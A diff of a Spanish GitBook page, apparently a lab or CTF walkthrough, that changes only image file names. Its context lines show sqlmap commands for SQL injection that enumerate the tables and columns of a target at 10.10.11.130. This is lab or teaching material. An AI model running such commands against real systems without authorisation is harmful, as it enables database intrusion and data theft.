@@ -66,7 +66,7 @@ Conocer las tablas de la base de datos objetivo.
 sqlmap -u http://10.10.11.130 --forms -D main --tables --batch
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Conocer las columnas de la tabla de la bases de datos objetivo.
 
@@ -74,7 +74,7 @@ Conocer las columnas de la tabla de la bases de datos objetivo.
 sqlmap -u http://10.10.11.130 --forms -D main -T user --columns --batch
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Conocer la información que hay en esas columnas.
 
